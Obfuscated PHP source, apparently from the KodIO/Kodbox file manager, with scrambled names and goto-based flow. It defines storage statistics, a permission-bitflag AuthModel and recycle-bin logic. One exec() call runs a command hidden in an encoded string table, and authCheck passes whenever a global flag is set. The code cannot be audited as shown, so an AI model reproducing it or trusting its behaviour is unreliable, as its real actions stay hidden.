$D´ªØ©‰è±[$d¦†Õ†¬²÷[2006]]; $Bš„µõ˜ˆ = Model($d¦†Õ†¬²÷[752])->where(array($d¦†Õ†¬²÷[367] => 0))->count($d¦†Õ†¬²÷[366]); $eÆóÚ›š = array($d¦†Õ†¬²÷[367] => 0, $d¦†Õ†¬²÷[184] => array($d¦†Õ†¬²÷[926], strtotime(date($d¦†Õ†¬²÷[2013])))); goto bŠ¬ªµÓÊÈ; bŠ¬ªµÓÊÈ: $E«º½“î­Ù = Model($d¦†Õ†¬²÷[752])->where($eÆóÚ›š)->sum($d¦†Õ†¬²÷[77]); $EØ•ŠĞƒó = Model($d¦†Õ†¬²÷[752])->where($eÆóÚ›š)->count($d¦†Õ†¬²÷[366]); return array($d¦†Õ†¬²÷[698] => $c—›”§¤™§, $d¦†Õ†¬²÷[2006] => $eÀÆŞèä’ö, $d¦†Õ†¬²÷[2039] => $c—›”§¤™§ - $eÀÆŞèä’ö, $d¦†Õ†¬²÷[2040] => (int) $E«º½“î­Ù, $d¦†Õ†¬²÷[700] => (int) $Bš„µõ˜ˆ, $d¦†Õ†¬²÷[2041] => (int) $EØ•ŠĞƒó); goto BóÆ«Áöò; BóÆ«Áöò: } private function optionAccess() { $Bò¥Šò¹Î =& $_SERVER[¢à]; return array($Bò¥Šò¹Î[695] => $this->typeLogCnt(), $Bò¥Šò¹Î[91] => $this->typeLogCnt($Bò¥Šò¹Î[91]), $Bò¥Šò¹Î[400] => $this->typeLogCnt($Bò¥Šò¹Î[400]), $Bò¥Šò¹Î[2042] => $this->typeLogCnt($Bò¥Šò¹Î[2042]), $Bò¥Šò¹Î[2043] => $this->typeLogCnt($Bò¥Šò¹Î[2043]), $Bò¥Šò¹Î[531] => $this->typeLogCnt($Bò¥Šò¹Î[33], $Bò¥Šò¹Î[2017])); } private function typeLogCnt($c‹•ô×—Ë = '', $C››‘Ì¾ò† = "\151\x64") { goto D…ì… ×±; Dª ¥…ë­£: return (int) $a­çĞ‚ÉÆÛ; goto eæ›à¤à˜ª; D…ì… ×±: $d™Ê­¥ÒÇ =& $_SERVER[¢à]; $aòŠÚĞ³¬¶ = array($d™Ê­¥ÒÇ[91] => array($d™Ê­¥ÒÇ[2044], $d™Ê­¥ÒÇ[2045]), $d™Ê­¥ÒÇ[400] => array($d™Ê­¥ÒÇ[2046], $d™Ê­¥ÒÇ[2047]), $d™Ê­¥ÒÇ[2042] => array($d™Ê­¥ÒÇ[2048], $d™Ê­¥ÒÇ[2049]), $d™Ê­¥ÒÇ[2043] => array($d™Ê­¥ÒÇ[2050], $d™Ê­¥ÒÇ[2051]), $d™Ê­¥ÒÇ[2052] => array($d™Ê­¥ÒÇ[2053], $d™Ê­¥ÒÇ[2054], $d™Ê­¥ÒÇ[2055])); $eµ’¾Í–ºê = strtotime(date($d™Ê­¥ÒÇ[2013])); goto Bíªù…Øæç; Bíªù…Øæç: $b³í”ÑÈè = array($d™Ê­¥ÒÇ[184] => array($d™Ê­¥ÒÇ[926], $eµ’¾Í–ºê)); if ($c‹•ô×—Ë) { $b³í”ÑÈè[$d™Ê­¥ÒÇ[29]] = array($d™Ê­¥ÒÇ[7], $aòŠÚĞ³¬¶[$c‹•ô×—Ë]); } $a­çĞ‚ÉÆÛ = Model($d™Ê­¥ÒÇ[2016])->where($b³í”ÑÈè)->count($C››‘Ì¾ò†); goto Dª ¥…ë­£; eæ›à¤à˜ª: } private function optionServer() { goto cØÑÆ´ìå¤; f¹ÖÄ¯‰ËÀ: $F‡‹‰öš¨‹ = $FœÓÔÙ–Û[0]; $eÑÜ­‡Î¯Ë = $GLOBALS[$AªÆÌ”‚‡‡[6]][$AªÆÌ”‚‡‡[17]]; $AÒŠ© ËÙ = $eÑÜ­‡Î¯Ë[$AªÆÌ”‚‡‡[886]]; goto cŠàğŞ¡Ø; EôÂÜôÕÙ«: $Açóˆ½œÍ„ = array($AªÆÌ”‚‡‡[743] => $f‰¤ê’»ˆ¸[$AªÆÌ”‚‡‡[364]]); $D‰Á„›§Ã¶ = Model($AªÆÌ”‚‡‡[418])->where($Açóˆ½œÍ„)->sum($AªÆÌ”‚‡‡[77]); $FœÓÔÙ–Û = explode($AªÆÌ”‚‡‡[50], $_SERVER[$AªÆÌ”‚‡‡[138]]); goto f¹ÖÄ¯‰ËÀ; cØÑÆ´ìå¤: $AªÆÌ”‚‡‡ =& $_SERVER[¢à]; $E÷‰¬·­í = $this->diskDriver(); $f‰¤ê’»ˆ¸ = KodIO::defaultDriver(); goto EôÂÜôÕÙ«; d×Á©¯¿Çå: return array($AªÆÌ”‚‡‡[2058] => $E÷‰¬·­í ? $E÷‰¬·­í[$AªÆÌ”‚‡‡[2059]] : 0, $AªÆÌ”‚‡‡[2060] => $E÷‰¬·­í ? $E÷‰¬·­í[$AªÆÌ”‚‡‡[2061]] : 0, $AªÆÌ”‚‡‡[2062] => (int) $f‰¤ê’»ˆ¸[$AªÆÌ”‚‡‡[2059]] * 1024 * 1024 * 1024, $AªÆÌ”‚‡‡[2063] => (int) $D‰Á„›§Ã¶, $AªÆÌ”‚‡‡[2064] => ucfirst($F‡‹‰öš¨‹), $AªÆÌ”‚‡‡[2065] => $AªÆÌ”‚‡‡[2066] . PHP_VERSION, $AªÆÌ”‚‡‡[2067] => phpBuild64() ? 64 : 32, $AªÆÌ”‚‡‡[694] => str_replace($AªÆÌ”‚‡‡[2068], $AªÆÌ”‚‡‡[902], $AÒŠ© ËÙ), $AªÆÌ”‚‡‡[334] => ucfirst($EªŒÃáæ‚§), $AªÆÌ”‚‡‡[28] => $_SERVER[$AªÆÌ”‚‡‡[2069]]); goto aŠ®©æ¥É; cŠàğŞ¡Ø: if ($AÒŠ© ËÙ == $AªÆÌ”‚‡‡[724]) { $aª¬šÜÁ‰È = explode($AªÆÌ”‚‡‡[1072], $eÑÜ­‡Î¯Ë[$AªÆÌ”‚‡‡[885]]); $AÒŠ© ËÙ = $aª¬šÜÁ‰È[0]; } if ($AÒŠ© ËÙ == $AªÆÌ”‚‡‡[727] || $AÒŠ© ËÙ == $AªÆÌ”‚‡‡[728]) { $EÒÜ÷à‘«¬ = Model()->db()->query($AªÆÌ”‚‡‡[2056]); $BÉµ‚ŒÀ” = $EÒÜ÷à‘«¬[0] && isset($EÒÜ÷à‘«¬[0][$AªÆÌ”‚‡‡[1316]]) ? $EÒÜ÷à‘«¬[0][$AªÆÌ”‚‡‡[1316]] : 0; $AÒŠ© ËÙ = $AªÆÌ”‚‡‡[2057] . ($BÉµ‚ŒÀ” ? $AªÆÌ”‚‡‡[8] . $BÉµ‚ŒÀ” : $AªÆÌ”‚‡‡[33]); } $EªŒÃáæ‚§ = $GLOBALS[$AªÆÌ”‚‡‡[6]][$AªÆÌ”‚‡‡[334]][$AªÆÌ”‚‡‡[753]]; goto d×Á©¯¿Çå; aŠ®©æ¥É: } private function diskDriver() { goto C«ŒÛ›×ĞÔ; fšõ¯å¬Ô§: $DÕì÷Î‹” = $aî–ÃÒ½² - @disk_free_space($eÁ„ò©Ìå); return array($a¸Ó®¿ à¢[2059] => $aî–ÃÒ½², $a¸Ó®¿ à¢[2061] => $DÕì÷Î‹”); goto eŒ¾Ø¯ƒª; C«ŒÛ›×ĞÔ: $a¸Ó®¿ à¢ =& $_SERVER[¢à]; $eÁ„ò©Ìå = $a¸Ó®¿ à¢[8]; $C Ş«„çÁñ = $GLOBALS[$a¸Ó®¿ à¢[6]][$a¸Ó®¿ à¢[2070]] == $a¸Ó®¿ à¢[2071]; goto a¤¨àÃö“Ø; a¤¨àÃö“Ø: if ($C Ş«„çÁñ) { $eÁ„ò©Ìå = $a¸Ó®¿ à¢[2072]; if (function_exists($a¸Ó®¿ à¢[2073])) { exec($a¸Ó®¿ à¢[2074], $DÀÙ–ùŒ†ç); $eÁ„ò©Ìå = $DÀÙ–ùŒ†ç[1] . $a¸Ó®¿ à¢[8]; } } if (!file_exists($eÁ„ò©Ìå)) { return; } $aî–ÃÒ½² = @disk_total_space($eÁ„ò©Ìå); goto fšõ¯å¬Ô§; eŒ¾Ø¯ƒª: } public function fileChart($eœ®Ûáñøë) { goto a„àÄÕŒÈ; D…™ÏëŠ³: $dñğöŒŒØÎ[$dÂ„¢ëÍ‘[368]] = 2; $F‰äÓ‚„‘¶ = Model($dÂ„¢ëÍ‘[752])->where($dñğöŒŒØÎ)->sum($dÂ„¢ëÍ‘[77]); return array($dÂ„¢ëÍ‘[698] => $FæŠ—Œ¼ÕÅ[$dÂ„¢ëÍ‘[77]], $dÂ„¢ëÍ‘[2006] => $FæŠ—Œ¼ÕÅ[$dÂ„¢ëÍ‘[2006]], $dÂ„¢ëÍ‘[2007] => (int) $A¹¤ëçÀ¤, $dÂ„¢ëÍ‘[2008] => (int) $F‰äÓ‚„‘¶); goto Cí‡Ö¥; b›İ†·ßÒ¨: $FæŠ—Œ¼ÕÅ = $this->sourceSize(); $dñğöŒŒØÎ = array($dÂ„¢ëÍ‘[457] => 0, $dÂ„¢ëÍ‘[368] => 1); $A¹¤ëçÀ¤ = Model($dÂ„¢ëÍ‘[752])->where($dñğöŒŒØÎ)->sum($dÂ„¢ëÍ‘[77]); goto D…™ÏëŠ³; a„àÄÕŒÈ: $dÂ„¢ëÍ‘ =& $_SERVER[¢à]; if (isset($eœ®Ûáñøë[$dÂ„¢ëÍ‘[1412]])) { return Model($dÂ„¢ëÍ‘[752])->userFileTypeProfile($eœ®Ûáñøë[$dÂ„¢ëÍ‘[1412]]); } if (isset($eœ®Ûáñøë[$dÂ„¢ëÍ‘[2075]])) { return Model($dÂ„¢ëÍ‘[752])->groupFileTypeProfile($eœ®Ûáñøë[$dÂ„¢ëÍ‘[2075]]); } goto b›İ†·ßÒ¨; Cí‡Ö¥: } private function sourceSize() { $cİ„µ®…¿ =& $_SERVER[¢à]; $f¦©…ÃöÙ = Model($cİ„µ®…¿[752])->where(array($cİ„µ®…¿[367] => 0))->sum($cİ„µ®…¿[77]); $F¨Ü¶•ÔÓ = Model($cİ„µ®…¿[418])->sum($cİ„µ®…¿[77]); if ($F¨Ü¶•ÔÓ > $f¦©…ÃöÙ) { $F¨Ü¶•ÔÓ = $f¦©…ÃöÙ; } return array($cİ„µ®…¿[77] => (int) $f¦©…ÃöÙ, $cİ„µ®…¿[2006] => (int) $F¨Ü¶•ÔÓ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $a–×äË¨¥Ç =& $_SERVER[¢à]; $BÛ˜ò¨êî = array(array($a–×äË¨¥Ç[383] => LNG($a–×äË¨¥Ç[2076]), $a–×äË¨¥Ç[2077] => $a–×äË¨¥Ç[2078], $a–×äË¨¥Ç[2079] => 6, $a–×äË¨¥Ç[2080] => 1, $a–×äË¨¥Ç[2081] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($a–×äË¨¥Ç[383] => LNG($a–×äË¨¥Ç[2082]), $a–×äË¨¥Ç[2077] => $a–×äË¨¥Ç[2083], $a–×äË¨¥Ç[2079] => 1, $a–×äË¨¥Ç[2080] => 1, $a–×äË¨¥Ç[2081] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($a–×äË¨¥Ç[383] => LNG($a–×äË¨¥Ç[2084]), $a–×äË¨¥Ç[2077] => $a–×äË¨¥Ç[2085], $a–×äË¨¥Ç[2079] => 2, $a–×äË¨¥Ç[2080] => 1, $a–×äË¨¥Ç[2081] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($a–×äË¨¥Ç[383] => LNG($a–×äË¨¥Ç[2086]), $a–×äË¨¥Ç[2077] => $a–×äË¨¥Ç[2085], $a–×äË¨¥Ç[2079] => 3, $a–×äË¨¥Ç[2080] => 1, $a–×äË¨¥Ç[2081] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($a–×äË¨¥Ç[383] => LNG($a–×äË¨¥Ç[2087]), $a–×äË¨¥Ç[2077] => $a–×äË¨¥Ç[2088], $a–×äË¨¥Ç[2079] => 4, $a–×äË¨¥Ç[2080] => 1, $a–×äË¨¥Ç[2081] => self::AUTH_SHOW | self::AUTH_VIEW), array($a–×äË¨¥Ç[383] => LNG($a–×äË¨¥Ç[2089]), $a–×äË¨¥Ç[2077] => $a–×äË¨¥Ç[2090], $a–×äË¨¥Ç[2079] => 5, $a–×äË¨¥Ç[2080] => 1, $a–×äË¨¥Ç[2081] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($a–×äË¨¥Ç[383] => LNG($a–×äË¨¥Ç[2091]), $a–×äË¨¥Ç[2077] => $a–×äË¨¥Ç[2092], $a–×äË¨¥Ç[2079] => 7, $a–×äË¨¥Ç[2080] => 1, $a–×äË¨¥Ç[2081] => 0)); return $BÛ˜ò¨êî; } public static function authCheck($e´Ì¦Éº†ù, $fìåé¶Òºº) { $e´Ì¦Éº†ù = intval($e´Ì¦Éº†ù); if (_get($GLOBALS, $_SERVER[¢à][453])) { return !0; } if ($e´Ì¦Éº†ù <= 0) { return !1; } if (($e´Ì¦Éº†ù & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($e´Ì¦Éº†ù & $fìåé¶Òºº); } public static function authCheckShow($d’¼º¥ŠÏ®) { return self::authCheck($d’¼º¥ŠÏ®, self::AUTH_SHOW); } public static function authCheckView($càğéºÀ) { return self::authCheck($càğéºÀ, self::AUTH_VIEW); } public static function authCheckDownload($a¾ëŞ‚åˆ) { return self::authCheck($a¾ëŞ‚åˆ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($a‚ ğ“óø£) { return self::authCheck($a‚ ğ“óø£, self::AUTH_UPLOAD); } public static function authCheckEdit($C¼²èğ™Ÿ) { return self::authCheck($C¼²èğ™Ÿ, self::AUTH_EDIT); } public static function authCheckRemove($dÏÂ–µ‚‹®) { return self::authCheck($dÏÂ–µ‚‹®, self::AUTH_REMOVE); } public static function authCheckShare($bÁÎ™Ä£ãˆ) { return self::authCheck($bÁÎ™Ä£ãˆ, self::AUTH_SHARE); } public static function authCheckComment($BöÑİâ÷ñ) { return self::authCheck($BöÑİâ÷ñ, self::AUTH_COMMENT); } public static function authCheckEvent($bÄĞìîÎ‘ï) { return self::authCheck($bÄĞìîÎ‘ï, self::AUTH_EVENT); } public static function authCheckRoot($B±”‡°ñšé) { return self::authCheck($B±”‡°ñšé, self::AUTH_ROOT); } public static function authDisable($a÷¦ƒî ‰, $C•ìî¬¦´) { if (intval($a÷¦ƒî ‰) <= 0) { return 0; } return intval($a÷¦ƒî ‰) & ~$C•ìî¬¦´; } public $optionType = "\123\x79\x73\164\145\x6d\56\163\157\165\x72\143\x65\x41\x75\164\x68\114\151\x73\x74"; public $field = array("\x6e\x61\155\145", "\141\165\x74\150", "\x6c\141\x62\x65\x6c", "\x64\x69\x73\160\x6c\141\x79", "\163\171\x73\164\145\155", "\x73\x6f\162\x74"); public function initData() { $E©İÕÙ­Ïç = $this->authDefault(); foreach ($E©İÕÙ­Ïç as $a‡éÛ½¤âÂ) { $this->add($a‡éÛ½¤âÂ); } } public function listData($E’âí§³„İ = false, $B„ÏÑäñ¦Œ = "\163\x6f\x72\x74", $A¶éÜãñ÷ = false) { return parent::listData($E’âí§³„İ, $B„ÏÑäñ¦Œ, $A¶éÜãñ÷); } public function update($F£‘¯ä“ù, $e¾¸øÀ…œó) { $a‘Äç·Î•— =& $_SERVER[¢à]; $Eîå”•ÅŠ = parent::listData($F£‘¯ä“ù); $A™•éîµª = $this->findByName($e¾¸øÀ…œó[$a‘Äç·Î•—[28]]); if (!$Eîå”•ÅŠ || $A™•éîµª && $A™•éîµª[$a‘Äç·Î•—[364]] != $Eîå”•ÅŠ[$a‘Äç·Î•—[364]]) { return !1; } $this->filterAuth($e¾¸øÀ…œó[$a‘Äç·Î•—[373]]); return parent::update($F£‘¯ä“ù, $e¾¸øÀ…œó); } public function remove($dÃ˜Î—ƒ) { $Aœèê«ğÎ = parent::listData($dÃ˜Î—ƒ); if (!$Aœèê«ğÎ || $Aœèê«ğÎ[$_SERVER[¢à][1076]]) { return !1; } return parent::remove($dÃ˜Î—ƒ); } public function add($AŠµ¸¹…¶ = array()) { goto C²µö–Øâœ; b¢ƒ‚ åÁœ: $AŠµ¸¹…¶ = array_merge($D¯İµÚ¨é, $AŠµ¸¹…¶); $AŠµ¸¹…¶[$DêçÎ‘‡°³[2096]] = $this->getSort(); $this->filterAuth($AŠµ¸¹…¶[$DêçÎ‘‡°³[373]]); goto cÓñğ³šš‹; C²µö–Øâœ: $DêçÎ‘‡°³ =& $_SERVER[¢à]; if ($this->findByName($AŠµ¸¹…¶[$DêçÎ‘‡°³[28]])) { return !1; } $D¯İµÚ¨é = array($DêçÎ‘‡°³[28] => $DêçÎ‘‡°³[33], $DêçÎ‘‡°³[373] => 1, $DêçÎ‘‡°³[2093] => $DêçÎ‘‡°³[2094], $DêçÎ‘‡°³[2095] => 1, $DêçÎ‘‡°³[1076] => 0, $DêçÎ‘‡°³[2096] => 0); goto b¢ƒ‚ åÁœ; cÓñğ³šš‹: return parent::insert($AŠµ¸¹…¶); goto B¬À«’…êì; B¬À«’…êì: } private function getSort() { $bêÆã‚Ìå’ =& $_SERVER[¢à]; $c ‹ç³‡á = parent::listData(); $Aøº‰©‰ÚÖ = array_to_keyvalue($c ‹ç³‡á, $bêÆã‚Ìå’[33], $bêÆã‚Ìå’[2096]); return empty($Aøº‰©‰ÚÖ) ? 0 : max($Aøº‰©‰ÚÖ) + 1; } private function filterAuth(&$c—šÑ÷„µ) { goto bù¨¿ÕİÁª; DäÏæçÇ±Æ: foreach ($b³å’æãÅä as $dğ˜”¾òï) { if (isset($d«ĞÍÍÄ÷ƒ[$dğ˜”¾òï])) { $b³å’æãÅä = array_merge($b³å’æãÅä, $d«ĞÍÍÄ÷ƒ[$dğ˜”¾òï]); } } $b³å’æãÅä[] = self::AUTH_SHOW; $c—šÑ÷„µ = array_sum(array_unique($b³å’æãÅä)); goto E°§µŒ ò¸; bù¨¿ÕİÁª: if (!$c—šÑ÷„µ) { return; } $D—¥Ä¤ÜåÌ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $b³å’æãÅä = array(); goto EØİÎ§İõ´; EØİÎ§İõ´: foreach ($D—¥Ä¤ÜåÌ as $dğ˜”¾òï) { if ($c—šÑ÷„µ & $dğ˜”¾òï) { $b³å’æãÅä[] = $dğ˜”¾òï; } } if (in_array(self::AUTH_ROOT, $b³å’æãÅä)) { $c—šÑ÷„µ = array_sum($D—¥Ä¤ÜåÌ); return; } $d«ĞÍÍÄ÷ƒ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto DäÏæçÇ±Æ; E°§µŒ ò¸: } public function sort($BÍìÀ¤Œ¢², $aÂİÏ¡Ï¼”) { return parent::update($BÍìÀ¤Œ¢², $aÂİÏ¡Ï¼”); } } goto fÕ‡¨²÷ ¼; fßâÄƒ¤Ä: define($_SERVER[¢à][0], $_SERVER[¢à][1]); $_SERVER[‚¬û] = explode($_SERVER[¢à][2], gzinflate(substr($_SERVER[¢à][3], 10, -8))); function Model($F«š¶‘Ì¨ = '', $EŠ³Ÿ‚ëÉõ = '', $aô×‹©›ò× = '') { goto Cˆ¤œ¤Ùğ’; aíâÊæÏİª: $F±Œ¸›ö [$EíÀ‰‰ëÃñ] = new ModelBase($F«š¶‘Ì¨, $EŠ³Ÿ‚ëÉõ, $aô×‹©›ò×); return $F±Œ¸›ö [$EíÀ‰‰ëÃñ]; goto cìä«Í±É; cáí¡Öô¦µ: if (isset($F±Œ¸›ö [$EíÀ‰‰ëÃñ])) { return $F±Œ¸›ö [$EíÀ‰‰ëÃñ]; } if ($F«š¶‘Ì¨) { $F«š¶‘Ì¨ = strtoupper($F«š¶‘Ì¨[0]) . substr($F«š¶‘Ì¨, 1); $E³•“­õÁ = $F«š¶‘Ì¨ . $bäµ¶¯˜‹[1]; if (class_exists($E³•“­õÁ)) { $F±Œ¸›ö [$EíÀ‰‰ëÃñ] = new $E³•“­õÁ(); return $F±Œ¸›ö [$EíÀ‰‰ëÃñ]; } } if (!$aô×‹©›ò×) { $aô×‹©›ò× = $GLOBALS[$bäµ¶¯˜‹[2]][$bäµ¶¯˜‹[3]]; } goto aíâÊæÏİª; Cˆ¤œ¤Ùğ’: $bäµ¶¯˜‹ =& $_SERVER[‚¬û]; static $F±Œ¸›ö  = array(); $EíÀ‰‰ëÃñ = strtolower($EŠ³Ÿ‚ëÉõ . $bäµ¶¯˜‹[0] . $F«š¶‘Ì¨); goto cáí¡Öô¦µ; cìä«Í±É: } goto d¯ùö¸‡Ò; bĞÁÖ‘ÓŠõ: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\165\x72\x63\145\137\162\x65\x63\171\143\x6c\x65"; protected $dataAuto = array(array("\143\162\x65\x61\x74\145\x54\x69\x6d\x65", "\x74\151\155\x65", "\151\x6e\163\x65\x72\x74", "\146\x75\x6e\143\164\x69\x6f\x6e")); public function listData($fÃŒãŒ²ò = false) { $D›ÂÈè‘ =& $_SERVER[¢à]; $fÃŒãŒ²ò = $fÃŒãŒ²ò ? $fÃŒãŒ²ò : USER_ID; $D§–´‰±º = $this->where(array($D›ÂÈè‘[1403] => $fÃŒãŒ²ò))->select(); return array_to_keyvalue($D§–´‰±º, $D›ÂÈè‘[33], $D›ÂÈè‘[366]); } public function moveToRecycle($A‚øØïîĞ…) { goto CšÊ‘ÒÀâÀ; e³ğİİ³Ñˆ: $this->recycleMove($A‚øØïîĞ…, 1); if ($e«ÁÎğÛŠ[$Eñ‚¢Éèá [367]] == $Eñ‚¢Éèá [83]) { $fÇƒĞ™«×Ë = array($Eñ‚¢Éèá [521] => array($Eñ‚¢Éèá [479], $e«ÁÎğÛŠ[$Eñ‚¢Éèá [455]] . $A‚øØïîĞ… . $Eñ‚¢Éèá [480])); $aÈŒÇ»à¯->where($fÇƒĞ™«×Ë)->setField($Eñ‚¢Éèá [393], 1); } goto aÖğ“¬ÅáÂ; C–Ğ×¯–Ä: if (!$e«ÁÎğÛŠ || $e«ÁÎğÛŠ[$Eñ‚¢Éèá [393]] == $Eñ‚¢Éèá [83]) { return; } $C›‚òà¿ï = array($Eñ‚¢Éèá [380] => $A‚øØïîĞ…, $Eñ‚¢Éèá [1403] => USER_ID, $Eñ‚¢Éèá [517] => $e«ÁÎğÛŠ[$Eñ‚¢Éèá [368]], $Eñ‚¢Éèá [518] => $e«ÁÎğÛŠ[$Eñ‚¢Éèá [452]], $Eñ‚¢Éèá [521] => $e«ÁÎğÛŠ[$Eñ‚¢Éèá [455]]); $this->add($C›‚òà¿ï); goto e³ğİİ³Ñˆ; CšÊ‘ÒÀâÀ: $Eñ‚¢Éèá  =& $_SERVER[¢à]; $aÈŒÇ»à¯ = Model($Eñ‚¢Éèá [1106]); $e«ÁÎğÛŠ = $aÈŒÇ»à¯->sourceInfo($A‚øØïîĞ…); goto C–Ğ×¯–Ä; aÖğ“¬ÅáÂ: } public function clear() { $this->remove(!1); } public function remove($Cµ…Ò©¬Â = false) { goto D…‚À±à´; E›ÅÏêñÆ: foreach ($fº¼÷ÊÂ¾§ as $fÂÖùˆÊ®Æ) { $fèª¢ÑÉñ->targetSpaceUpdate($fÂÖùˆÊ®Æ[$D‚ÂéÍÉ§®[368]], $fÂÖùˆÊ®Æ[$D‚ÂéÍÉ§®[452]]); } goto E„à¡°¨İ¢; D…‚À±à´: $D‚ÂéÍÉ§® =& $_SERVER[¢à]; $fèª¢ÑÉñ = Model($D‚ÂéÍÉ§®[1106]); $bŠºãŒ£§ = $this->listData(); goto dê»‡¸ŠÛ; dê»‡¸ŠÛ: $Cµ…Ò©¬Â = $Cµ…Ò©¬Â === !1 ? !1 : $Cµ…Ò©¬Â; $fº¼÷ÊÂ¾§ = array(); foreach ($bŠºãŒ£§ as $Dù£…ìø§®) { if ($Cµ…Ò©¬Â != !1 && !in_array($Dù£…ìø§®, $Cµ…Ò©¬Â)) { continue; } $fèª¢ÑÉñ->remove($Dù£…ìø§®, !1); $Bã‰ÓÍ’æ = $this->where(array($D‚ÂéÍÉ§®[366] => $Dù£…ìø§®))->find(); $B ÆÈÈµé = $Bã‰ÓÍ’æ[$D‚ÂéÍÉ§®[368]] . $D‚ÂéÍÉ§®[70] . $Bã‰ÓÍ’æ[$D‚ÂéÍÉ§®[452]]; $fº¼÷ÊÂ¾§[$B ÆÈÈµé] = array($D‚ÂéÍÉ§®[517] => $Bã‰ÓÍ’æ[$D‚ÂéÍÉ§®[368]], $D‚ÂéÍÉ§®[452] => $Bã‰ÓÍ’æ[$D‚ÂéÍÉ§®[452]]); $this->where(array($D‚ÂéÍÉ§®[366] => $Dù£…ìø§®))->delete(); } goto E›ÅÏêñÆ; E„à¡°¨İ¢: } public function restore($d·ÃÖÈ…‹Ô = false) { goto Fòµ¿³¡ç; Fòµ¿³¡ç: $c™¨†º´¡‹ =& $_SERVER[¢à]; $Aùî÷Ğ³ï³ = Model($c™¨†º´¡‹[1106]); $bŒ…¨˜è‰¬ = $this->listData(); goto B§®¼ä¦é„; B§®¼ä¦é„: $d·ÃÖÈ…‹Ô = $d·ÃÖÈ…‹Ô == !1 ? !1 : $d·ÃÖÈ…‹Ô; if (!$bŒ…¨˜è‰¬) { return !0; } $eÆ„„ÈæÄ = array(); goto f‹­«”œÜ; f‹­«”œÜ: foreach ($bŒ…¨˜è‰¬ as $CéóÏÏƒÇù) { goto EÇğÑ ÍŒò; EÇğÑ ÍŒò: if ($d·ÃÖÈ…‹Ô != !1 && !in_array($CéóÏÏƒÇù, $d·ÃÖÈ…‹Ô)) { continue; } $fã¶ÃñÄòÈ = $Aùî÷Ğ³ï³->sourceInfo($CéóÏÏƒÇù); $f‚Êäà®÷ = $Aùî÷Ğ³ï³->sourceInfo($fã¶ÃñÄòÈ[$c™¨†º´¡‹[457]]); goto DˆáÓ‡ƒê¾; f­ä¬±¨ùà: if ($fã¶ÃñÄòÈ[$c™¨†º´¡‹[367]] == $c™¨†º´¡‹[83]) { $eå°òÑÕÉ = array($c™¨†º´¡‹[521] => array($c™¨†º´¡‹[479], $fã¶ÃñÄòÈ[$c™¨†º´¡‹[455]] . $CéóÏÏƒÇù . $c™¨†º´¡‹[480])); $Aùî÷Ğ³ï³->where($eå°òÑÕÉ)->setField($c™¨†º´¡‹[393], 0); } $this->where(array($c™¨†º´¡‹[366] => $CéóÏÏƒÇù))->delete(); $Aùî÷Ğ³ï³->folderSizeReset($fã¶ÃñÄòÈ[$c™¨†º´¡‹[457]]); goto còƒËó±Œ; DˆáÓ‡ƒê¾: if ($f‚Êäà®÷[$c™¨†º´¡‹[393]] == $c™¨†º´¡‹[83]) { continue; } $Aùî÷Ğ³ï³->lockMoveStart($CéóÏÏƒÇù); $this->recycleMove($CéóÏÏƒÇù, 0); goto f­ä¬±¨ùà; còƒËó±Œ: $eÆ„„ÈæÄ[] = $fã¶ÃñÄòÈ[$c™¨†º´¡‹[457]]; if ($fã¶ÃñÄòÈ[$c™¨†º´¡‹[367]] == $c™¨†º´¡‹[83]) { $eÆ„„ÈæÄ[] = $CéóÏÏƒÇù; } $Aùî÷Ğ³ï³->lockMoveEnd($CéóÏÏƒÇù); goto fˆâÎ’«À; fˆâÎ’«À: } $Aùî÷Ğ³ï³->updateModifyTime($eÆ„„ÈæÄ); goto F´î»ğ; F´î»ğ: } private function recycleMove($eÕÄîÅË°÷, $aÈÒ§êÉ£ç = 1) { $B­²èÅ¼²ë =& $_SERVER[¢à]; $AøŠ„ó¿¢ = Model($B­²èÅ¼²ë[1106]); $FËÍ‰”ùè = Model($B­²èÅ¼²ë[2324]); $EÑÕœÔ°» = array($B­²èÅ¼²ë[366] => $eÕÄîÅË°÷); if ($aÈÒ§êÉ£ç) { $AøŠ„ó¿¢->where($EÑÕœÔ°»)->setField($B­²èÅ¼²ë[393], 1); $FËÍ‰”ùè->eventRecycle($eÕÄîÅË°÷, $B­²èÅ¼²ë[2325]); } else { $eº÷ƒ¼âÄ = $AøŠ„ó¿¢->where($EÑÕœÔ°»)->find(); $CÅ‹¤‹…Ú = $eº÷ƒ¼âÄ[$B­²èÅ¼²ë[367]] == $B­²èÅ¼²ë[83]; $cô®¦×Ø»Ü = $AøŠ„ó¿¢->fileNameAuto($eº÷ƒ¼âÄ[$B­²èÅ¼²ë[457]], $eº÷ƒ¼âÄ[$B­²èÅ¼²ë[28]], REPEAT_RENAME_FOLDER, $CÅ‹¤‹…Ú); if 